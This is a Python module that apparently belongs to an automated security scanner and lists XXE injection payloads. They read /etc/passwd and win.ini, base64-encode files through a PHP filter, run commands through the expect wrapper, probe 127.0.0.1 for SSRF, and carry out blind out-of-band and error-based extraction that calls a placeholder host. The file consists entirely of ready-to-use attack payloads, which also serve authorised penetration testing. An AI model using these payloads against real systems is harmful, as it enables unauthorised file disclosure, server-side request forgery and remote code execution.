"""XXE (XML External Entity) injection payloads."""

# ── Tier 1: Inline entity injection ───────────────────────────────────────────
XXE_T1 = [
    # Classic /etc/passwd read
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Windows variant
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>""",

    # PHP filter — base64-encode any file
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",

    # Expect wrapper (PHP expect extension — RCE)
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root><data>&xxe;</data></root>""",

    # SSRF via XXE — internal probe
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
<root><data>&xxe;</data></root>""",
]

# ── Blind XXE — out-of-band (Oracle will adapt the interactsh/burp-collab URL) ─
XXE_BLIND = [
    # Parameter entity OOB — placeholder URL substituted at runtime
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://OOBURL/xxe">
  %xxe;
]>
<root><data>test</data></root>""",

    # Error-based blind XXE
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<root><data>test</data></root>""",
]
